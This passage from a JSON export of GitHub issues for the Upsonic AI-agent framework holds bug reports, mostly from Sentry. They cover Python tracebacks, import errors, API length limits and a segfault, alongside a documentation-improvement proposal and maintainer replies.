_handle_signal\n    signal.default_int_handler(signum, frame)\nKeyboardInterrupt\n\nDuring handling of the above exception, another exception occurred:\n\nTraceback (most recent call last):\n  File \"/Volumes/MAC/Applications/anaconda3/envs/Upsonic/lib/python3.12/site-packages/starlette/routing.py\", line 699, in lifespan\n    await receive()\n  File \"/Volumes/MAC/Applications/anaconda3/envs/Upsonic/lib/python3.12/site-packages/uvicorn/lifespan/on.py\", line 137, in receive\n    return await self.receive_queue.get()\n           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/Volumes/MAC/Applications/anaconda3/envs/Upsonic/lib/python3.12/asyncio/queues.py\", line 158, in get\n    await getter\nasyncio.exceptions.CancelledError\n\nFailed to start the server: context canceled\nERROR:root:Error during cleanup of server ExelMCP: Attempted to exit cancel scope in a different task than it was entered in\nERROR:    Traceback (most recent call last):\n  File \"/Volumes/MAC/Applications/anaconda3/envs/Upsonic/lib/python3.12/asyncio/runners.py\", line 195, in run\n    return runner.run(main)\n           ^^^^^^^^^^^^^^^^\n  File \"/Volumes/MAC/Applications/anaconda3/envs/Upsonic/lib/python3.12/asyncio/runners.py\", line 118, in run\n    return self._loop.run_until_complete(task)\n           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/Volumes/MAC/Applications/anaconda3/envs/Upsonic/lib/python3.12/asyncio/base_events.py\", line 678, in run_until_complete\n    self.run_forever()\n  File \"/Volumes/MAC/Applications/anaconda3/envs/Upsonic/lib/python3.12/asyncio/base_events.py\", line 645, in run_forever\n    self._run_once()\n  File \"/Volumes/MAC/Applications/anaconda3/envs/Upsonic/lib/python3.12/asyncio/base_events.py\", line 1961, in _run_once\n    event_list = self._selector.select(timeout)\n                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/Volumes/MAC/Applications/anaconda3/envs/Upsonic/lib/python3.12/selectors.py\", line 566, in select\n    kev_list = self._selector.control(None, max_ev, timeout)\n               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/Volumes/MAC/Applications/anaconda3/envs/Upsonic/lib/python3.12/site-packages/upsonic/storage/configuration.py\", line 33, in _handle_signal\n    signal.default_int_handler(signum, frame)\nKeyboardInterrupt\n\nDuring handling of the above exception, another exception occurred:\n\nTraceback (most recent call last):\n  File \"/Volumes/MAC/Applications/anaconda3/envs/Upsonic/lib/python3.12/site-packages/starlette/routing.py\", line 699, in lifespan\n    await receive()\n  File \"/Volumes/MAC/Applications/anaconda3/envs/Upsonic/lib/python3.12/site-packages/uvicorn/lifespan/on.py\", line 137, in receive\n    return await self.receive_queue.get()\n           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/Volumes/MAC/Applications/anaconda3/envs/Upsonic/lib/python3.12/asyncio/queues.py\", line 158, in get\n    await getter\nasyncio.exceptions.CancelledError\n\n`\n\n**Expected behavior**\nit works to the end with results\n\n\n**Desktop (please complete the following information):**\n - OS: [macOS 13.7.4]\n - Upsonic Version [0.49.0]\n- Python Version [3.12]\n- AI model: openai/gpt-4o",
+      "state": "open",
+      "author": "gaord",
+      "author_type": "User",
+      "created_at": "2025-03-23T15:06:40Z",
+      "updated_at": "2025-03-23T15:06:40Z",
+      "closed_at": null,
+      "labels": [
+        "bug"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 0,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/301/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/301",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/301",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:53.154357",
+      "comments": []
+    },
+    {
+      "issue_number": 276,
+      "title": "Operation failed: Error processing Agent request: Error code: 400 - {'error': {'message': \"Invalid 'tools[0].function.description': string too long. Expected a string with maximum length 1024, but got a string with length 2780 instead.\", 'type': 'invali...",
+      "body": "Sentry Issue: [UPSONIC-PR](https://upsonic.sentry.io/issues/6413354149/?referrer=github_integration)\n\n```\nOperation failed: Error processing Agent request: Error code: 400 - {'error': {'message': \"Invalid 'tools[0].function.description': string too long. Expected a string with maximum length 1024, but got a string with length 2780 instead.\", 'type': 'invalid_request_error', 'param': 'tools[0].function.description', 'code': 'string_above_max_length'}}\n```",
+      "state": "closed",
+      "author": "sentry-io[bot]",
+      "author_type": "Bot",
+      "created_at": "2025-03-19T01:20:49Z",
+      "updated_at": "2025-03-23T00:47:11Z",
+      "closed_at": "2025-03-23T00:47:11Z",
+      "labels": [
+        "bug"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 0,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/276/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/276",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/276",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:53.154374",
+      "comments": []
+    },
+    {
+      "issue_number": 274,
+      "title": "CallErrorException: {'status_code': 500, 'detail': \"Error processing Agent request: object dict can't be used in 'await' expression\"}",
+      "body": "Sentry Issue: [UPSONIC-M4](https://upsonic.sentry.io/issues/6389305157/?referrer=github_integration)\n\n```\nCallErrorException: {'status_code': 500, 'detail': \"Error processing Agent request: object dict can't be used in 'await' expression\"}\n(10 additional frame(s) were not displayed)\n...\n  File \"upsonic/client/level_two/agent.py\", line 461, in agent_async_\n    raise outer_e\n  File \"upsonic/client/level_two/agent.py\", line 448, in agent_async_\n    the_result = await self.send_agent_request_async(agent_configuration, task, llm_model)\n  File \"upsonic/client/level_two/agent.py\", line 570, in send_agent_request_async\n    raise last_error\n  File \"upsonic/client/level_two/agent.py\", line 531, in send_agent_request_async\n    error_handler(result)\n  File \"upsonic/client/level_utilized/utility.py\", line 127, in error_handler\n    raise CallErrorException(result)\n```",
+      "state": "closed",
+      "author": "sentry-io[bot]",
+      "author_type": "Bot",
+      "created_at": "2025-03-19T01:19:38Z",
+      "updated_at": "2025-03-22T23:19:08Z",
+      "closed_at": "2025-03-22T23:19:08Z",
+      "labels": [
+        "bug"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 0,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/274/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/274",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/274",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:53.154379",
+      "comments": []
+    },
+    {
+      "issue_number": 271,
+      "title": "CallErrorException: {'status_code': 500, 'detail': \"Error processing Agent request: No module named 'browser_use'\"}",
+      "body": "Sentry Issue: [UPSONIC-DD](https://upsonic.sentry.io/issues/6330617114/?referrer=github_integration)\n\n```\nCallErrorException: {'status_code': 500, 'detail': \"Error processing Agent request: No module named 'browser_use'\"}\n(6 additional frame(s) were not displayed)\n...\n  File \"invest.py\", line 53, in <module>\n    investing_agent.print_do(investing_task)\n```",
+      "state": "closed",
+      "author": "sentry-io[bot]",
+      "author_type": "Bot",
+      "created_at": "2025-03-19T01:18:15Z",
+      "updated_at": "2025-03-22T22:28:32Z",
+      "closed_at": "2025-03-22T22:28:32Z",
+      "labels": [
+        "bug"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 0,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/271/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/271",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/271",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:53.154384",
+      "comments": []
+    },
+    {
+      "issue_number": 275,
+      "title": "MarkupError: closing tag '[/iphone-16-pro-128gb-siyah-p-HBCV00006Y4HBH]' at position 94 doesn't match any open tag",
+      "body": "Sentry Issue: [UPSONIC-M5](https://upsonic.sentry.io/issues/6389372610/?referrer=github_integration)\n\n```\nMarkupError: closing tag '[/iphone-16-pro-128gb-siyah-p-HBCV00006Y4HBH]' at position 94 doesn't match any open tag\n(22 additional frame(s) were not displayed)\n...\n  File \"AIAgentBrowserUse_upsonic.py\", line 85, in <module>\n    phones = agent_runner.run()\n  File \"AIAgentBrowserUse_upsonic.py\", line 42, in run\n    agent.do(task)\n```",
+      "state": "closed",
+      "author": "sentry-io[bot]",
+      "author_type": "Bot",
+      "created_at": "2025-03-19T01:19:58Z",
+      "updated_at": "2025-03-22T19:39:19Z",
+      "closed_at": "2025-03-22T19:39:19Z",
+      "labels": [
+        "bug"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 0,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/275/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/275",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/275",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:53.154390",
+      "comments": []
+    },
+    {
+      "issue_number": 268,
+      "title": "ImportError: cannot import name 'LightRAG' from 'lightrag' (unknown location)",
+      "body": "Sentry Issue: [UPSONIC-QC](https://upsonic.sentry.io/issues/6419717738/?referrer=github_integration)\n\n```\nImportError: cannot import name 'LightRAG' from 'lightrag' (unknown location)\n(9 additional frame(s) were not displayed)\n...\n  File \"main.py\", line 36, in <module>\n    agent.print_do(task1)\n```",
+      "state": "closed",
+      "author": "sentry-io[bot]",
+      "author_type": "Bot",
+      "created_at": "2025-03-18T22:29:49Z",
+      "updated_at": "2025-03-22T18:38:56Z",
+      "closed_at": "2025-03-22T18:38:56Z",
+      "labels": [
+        "bug"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 1,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/268/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/268",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/268",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:53.154394",
+      "comments": [
+        {
+          "author": "onuratakan",
+          "body": "Hi, thanks. Now we have the installation section for knowledge base in docs.\n\nhttps://docs.upsonic.ai/concepts/knowledge_base#installing-rag-library\n",
+          "created_at": "2025-03-22T18:38:56Z"
+        }
+      ]
+    },
+    {
+      "issue_number": 288,
+      "title": "[BUG] cannot import name 'set_logger' from 'lightrag.utils'",
+      "body": "**Describe the bug**\nFunction name mismatch when using KnowledgeBase.\n\n**To Reproduce**\nSteps to reproduce the behavior:\n1. Use this code:\n```python\ncontext = KnowledgeBase(\n    sources=[\"s1.pdf\"],\n    rag_model=\"openai/text-embedding-3-small\"\n)\n\ndetermine_action_plan = Task(\n    \"\"\"         \n    Determine what's the idea\n    \"\"\",\n    context=[context],\n)\n\n```\n2. Run with this command\n```console\n\n```\n\n4. See error\nImportError: cannot import name 'set_logger' from 'lightrag.utils'\n\n**Expected behavior**\nTo not throw ImportError\n\n**Screenshots**\n![Image](https://github.com/user-attachments/assets/229270f3-9807-47c9-b90e-771e39b581c7)\n\n**Desktop (please complete the following information):**\n - OS: Ubuntu\n - Upsonic Version 0.49.0\n- Python Version 3.11\n",
+      "state": "closed",
+      "author": "patrasq",
+      "author_type": "User",
+      "created_at": "2025-03-19T19:06:10Z",
+      "updated_at": "2025-03-22T15:16:59Z",
+      "closed_at": "2025-03-22T15:16:59Z",
+      "labels": [
+        "bug"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 0,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/288/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/288",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/288",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:53.418053",
+      "comments": []
+    },
+    {
+      "issue_number": 264,
+      "title": "HTTPStatusError: Server error '500 Internal Server Error' for url 'http://localhost:7541/level_one/gpt4o'",
+      "body": "Sentry Issue: [UPSONIC-5M](https://upsonic.sentry.io/issues/6284501973/?referrer=github_integration)\n\n```\nHTTPStatusError: Server error '500 Internal Server Error' for url 'http://localhost:7541/level_one/gpt4o'\nFor more information check: https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/500\n(10 additional frame(s) were not displayed)\n...\n  File \"main.py\", line 25, in <module>\n    agent.print_do(task)\n```",
+      "state": "closed",
+      "author": "sentry-io[bot]",
+      "author_type": "Bot",
+      "created_at": "2025-03-18T22:11:02Z",
+      "updated_at": "2025-03-22T14:07:59Z",
+      "closed_at": "2025-03-22T14:07:59Z",
+      "labels": [
+        "bug"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 0,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/264/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/264",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/264",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:53.418074",
+      "comments": []
+    },
+    {
+      "issue_number": 293,
+      "title": "InvalidOperation: [<class 'decimal.ConversionSyntax'>]",
+      "body": "Sentry Issue: [UPSONIC-K2](https://upsonic.sentry.io/issues/6380255750/?referrer=github_integration)\n\n```\nInvalidOperation: [<class 'decimal.ConversionSyntax'>]\n(3 additional frame(s) were not displayed)\n...\n  File \"test1.py\", line 19, in <module>\n    agent.do(task)\n```",
+      "state": "closed",
+      "author": "sentry-io[bot]",
+      "author_type": "Bot",
+      "created_at": "2025-03-22T12:47:15Z",
+      "updated_at": "2025-03-22T13:04:26Z",
+      "closed_at": "2025-03-22T13:04:26Z",
+      "labels": [
+        "bug"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 0,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/293/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/293",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/293",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:55.171779",
+      "comments": []
+    },
+    {
+      "issue_number": 285,
+      "title": "ReadError: [Errno 54] Connection reset by peer",
+      "body": "Sentry Issue: [UPSONIC-N9](https://upsonic.sentry.io/issues/6394887962/?referrer=github_integration)\n\n```\nReadError: [Errno 54] Connection reset by peer\n(7 additional frame(s) were not displayed)\n...\n  File \"httpcore/_sync/http11.py\", line 177, in _receive_response_headers\n    event = self._receive_event(timeout=timeout)\n  File \"httpcore/_sync/http11.py\", line 217, in _receive_event\n    data = self._network_stream.read(\n  File \"httpcore/_backends/sync.py\", line 126, in read\n    with map_exceptions(exc_map):\n  File \"contextlib.py\", line 158, in __exit__\n    self.gen.throw(value)\n  File \"httpcore/_exceptions.py\", line 14, in map_exceptions\n    raise to_exc(exc) from exc\n\nReadError: [Errno 54] Connection reset by peer\n(15 additional frame(s) were not displayed)\n...\n  File \"browser_agent.py\", line 22, in <module>\n    agent.print_do(task)\n```",
+      "state": "open",
+      "author": "sentry-io[bot]",
+      "author_type": "Bot",
+      "created_at": "2025-03-19T01:28:14Z",
+      "updated_at": "2025-03-19T01:28:14Z",
+      "closed_at": null,
+      "labels": [
+        "bug"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 0,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/285/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/285",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/285",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:55.171811",
+      "comments": []
+    },
+    {
+      "issue_number": 284,
+      "title": "CallErrorException: {'status_code': 500, 'detail': 'Error processing Call request: Not implemented'}",
+      "body": "Sentry Issue: [UPSONIC-NS](https://upsonic.sentry.io/issues/6396517164/?referrer=github_integration)\n\n```\nRuntimeError: no running event loop\n  File \"upsonic/client/level_one/call.py\", line 39, in call\n    loop = asyncio.get_running_loop()\n\nCallErrorException: {'status_code': 500, 'detail': 'Error processing Call request: Not implemented'}\n(6 additional frame(s) were not displayed)\n...\n  File \"upsonic/client/direct_llm_call/direct_llm_cal.py\", line 38, in do\n    return the_client.call(task, model)\n  File \"upsonic/client/level_one/call.py\", line 77, in call\n    raise outer_e\n  File \"upsonic/client/level_one/call.py\", line 65, in call\n    the_result = asyncio.run(self.call_async_(task, llm_model))\n  File \"upsonic/client/level_one/call.py\", line 197, in call_async_\n    error_handler(result)\n  File \"upsonic/client/level_utilized/utility.py\", line 127, in error_handler\n    raise CallErrorException(result)\n```",
+      "state": "open",
+      "author": "sentry-io[bot]",
+      "author_type": "Bot",
+      "created_at": "2025-03-19T01:27:54Z",
+      "updated_at": "2025-03-19T01:27:54Z",
+      "closed_at": null,
+      "labels": [
+        "bug"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 0,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/284/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/284",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/284",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:55.171818",
+      "comments": []
+    },
+    {
+      "issue_number": 283,
+      "title": "NoAPIKeyException: No VLLM base URL provided. Please set VLLM_BASE_URL in your configuration.",
+      "body": "Sentry Issue: [UPSONIC-PB](https://upsonic.sentry.io/issues/6408892614/?referrer=github_integration)\n\n```\nNoAPIKeyException: No VLLM base URL provided. Please set VLLM_BASE_URL in your configuration.\n(9 additional frame(s) were not displayed)\n...\n  File \"upsonic/client/level_two/agent.py\", line 703, in multiple_async\n    await self.call_async(mode_selector, llm_model)\n  File \"upsonic/client/level_one/call.py\", line 139, in call_async\n    raise outer_e\n  File \"upsonic/client/level_one/call.py\", line 129, in call_async\n    the_result = await self.call_async_(task, llm_model)\n  File \"upsonic/client/level_one/call.py\", line 197, in call_async_\n    error_handler(result)\n  File \"upsonic/client/level_utilized/utility.py\", line 115, in error_handler\n    raise NoAPIKeyException(result[\"detail\"])\n```",
+      "state": "open",
+      "author": "sentry-io[bot]",
+      "author_type": "Bot",
+      "created_at": "2025-03-19T01:26:57Z",
+      "updated_at": "2025-03-19T01:26:57Z",
+      "closed_at": null,
+      "labels": [
+        "bug"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 0,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/283/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/283",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/283",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:55.171823",
+      "comments": []
+    },
+    {
+      "issue_number": 279,
+      "title": "OSError: [Errno 63] File name too long: \"/Users/franciscopinto/Library/CloudStorage/OneDrive-WYgroup/Digital MZN Shared/WYnova/Research/Tools/Upsonic/organized_documents/To_classify_and_rename_a_legal_document,_you'll_need_to_follow_a_few_steps_to_ensure_the_doc...",
+      "body": "Sentry Issue: [UPSONIC-QX](https://upsonic.sentry.io/issues/6422169524/?referrer=github_integration)\n\n```\nOSError: [Errno 63] File name too long: \"/Users//Tools/Upsonic/organized_documents/To_classify_and_rename_a_legal_document,_you'll_need_to_follow_a_few_steps_to_ensure_the_document_is_organized_and_easy_to_identify._Since_I_don't_have_the_document_itself,_I'll_provide_a_general_guide_based_on_common_classifications_and_naming_conventions.\"\n  File \"_backup.py\", line 254, in <module>\n    sort_documents_into_folders(processed_file_paths, assigned_categories)\n  File \"backup.py\", line 243, in sort_documents_into_folders\n    os.makedirs(category_folder, exist_ok=True)\n```",
+      "state": "open",
+      "author": "sentry-io[bot]",
+      "author_type": "Bot",
+      "created_at": "2025-03-19T01:24:02Z",
+      "updated_at": "2025-03-19T01:24:02Z",
+      "closed_at": null,
+      "labels": [
+        "bug"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 0,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/279/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/279",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/279",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:55.171829",
+      "comments": []
+    },
+    {
+      "issue_number": 270,
+      "title": "CallErrorException: {'status_code': 500, 'detail': 'Error processing Call request: Exceeded maximum retries (5) for result validation'}",
+      "body": "Sentry Issue: [UPSONIC-AH](https://upsonic.sentry.io/issues/6317562253/?referrer=github_integration)\n\n```\nCallErrorException: {'status_code': 500, 'detail': 'Error processing Call request: Exceeded maximum retries (5) for result validation'}\n(4 additional frame(s) were not displayed)\n...\n  File \"test.py\", line 60, in <module>\n    results = MultiAgent.do(\n```",
+      "state": "open",
+      "author": "sentry-io[bot]",
+      "author_type": "Bot",
+      "created_at": "2025-03-19T01:17:51Z",
+      "updated_at": "2025-03-19T01:17:51Z",
+      "closed_at": null,
+      "labels": [
+        "bug"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 0,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/270/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/270",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/270",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:55.171833",
+      "comments": []
+    },
+    {
+      "issue_number": 95,
+      "title": "Adding Documentation and Improving Code Quality.",
+      "body": "## Proposal: Improve Code Documentation\r\n\r\n### Description\r\nHello and good day. I would love to propose adding comprehensive code documentation, which impacts readability and maintainability to the codebase. I propose enhancing it by adding comments, docstrings, and Sphinx documentation.\r\n\r\n### Goals\r\n1. Improve code readability for contributors.\r\n2. Facilitate understanding of complex logic.\r\n3. Enable automatic documentation generation.\r\n\r\n### Areas to Address\r\n- [x] #99\r\n- [x] #100\r\n- [ ] Set up Sphinx for API documentation.\r\n- [ ] Provide initial PRs for adding comments and docstrings to key modules.\r\n\r\nIf this is considered, I'd love to be a part of the contribution, study the code, add comments, docstrings (numpy) and sphinx documentation. If possible and approved, PEP8 code style can be employed.\r\n\r\nPlease let me know if this proposal aligns with the project's goals, and if there are any specific guidelines or preferences to follow while implementing these changes.",
+      "state": "closed",
+      "author": "KramStyles",
+      "author_type": "User",
+      "created_at": "2024-06-08T23:59:25Z",
+      "updated_at": "2024-12-11T22:04:50Z",
+      "closed_at": "2024-12-11T22:04:50Z",
+      "labels": [
+        "improvement"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 4,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/95/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/95",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/95",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:55.171846",
+      "comments": [
+        {
+          "author": "onuratakan",
+          "body": "Firstly, thank you too much, secondly we have another plan for documentation but the other things totally accepted and needed.\r\n\r\n",
+          "created_at": "2024-06-09T00:44:38Z"
+        },
+        {
+          "author": "onuratakan",
+          "body": "I will create sub-issues for these include documentation website process.",
+          "created_at": "2024-06-09T00:45:03Z"
+        },
+        {
+          "author": "onuratakan",
+          "body": "I will add comments, can you write docstrings @KramStyles ?",
+          "created_at": "2024-06-09T00:47:29Z"
+        },
+        {
+          "author": "KramStyles",
+          "body": "Sure. I'm on it",
+          "created_at": "2024-06-09T08:42:26Z"
+        }
+      ]
+    },
+    {
+      "issue_number": 76,
+      "title": "Segmentation fault (core dumped)  - Ubuntu",
+      "body": "Hi ! :wave: \r\n\r\nI have `[1]    1427530 segmentation fault (core dumped)  computerassistant` error while trying to interact with computerassistant.\r\n\r\nWhen I ask a question, it answers well but crash just after.\r\n\r\nHere is an example while asking \"how are you ?\"\r\n\r\n```\r\n~ computerassistant\r\n\r\n[09:59:17] Upsonic active                                                                                                                                                   on_prem.py:130\r\nWARNING: pip is being invoked by an old script wrapper. This will fail in a future version of pip.\r\nPlease see https://github.com/pypa/pip/issues/5599 for advice on fixing the underlying issue.\r\nTo avoid this problem you can invoke Python with '-m pip' instead of running pip directly.\r\nCollecting AppOpener==1.7\r\n  Using cached appopener-1.7-py3-none-any.whl (12 kB)\r\nRequirement already satisfied: wheel in /usr/lib/python3/dist-packages (from AppOpener==1.7) (0.37.1)\r\nRequirement already satisfied: regex in /usr/local/lib/python3.10/dist-packages (from AppOpener==1.7) (2024.5.15)\r\nRequirement already satisfied: psutil in /usr/lib/python3/dist-packages (from AppOpener==1.7) (5.9.0)\r\nERROR: Could not find a version that satisfies the requirement pywin32 (from appopener) (from versions: none)\r\nERROR: No matching distribution found for pywin32\r\nWARNING: pip is being invoked by an old script wrapper. This will fail in a future version of pip.\r\nPlease see https://github.com/pypa/pip/issues/5599 for advice on fixing the underlying issue.\r\nTo avoid this problem you can invoke Python with '-m pip' instead of running pip directly.\r\nCollecting AppOpener==1.7\r\n  Using cached appopener-1.7-py3-none-any.whl (12 kB)\r\nRequirement already satisfied: wheel in /usr/lib/python3/dist-packages (from AppOpener==1.7) (0.37.1)\r\nRequirement already satisfied: regex in /usr/local/lib/python3.10/dist-packages (from AppOpener==1.7) (2024.5.15)\r\nRequirement already satisfied: psutil in /usr/lib/python3/dist-packages (from AppOpener==1.7) (5.9.0)\r\nERROR: Could not find a version that satisfies the requirement pywin32 (from appopener) (from versions: none)\r\nERROR: No matching distribution found for 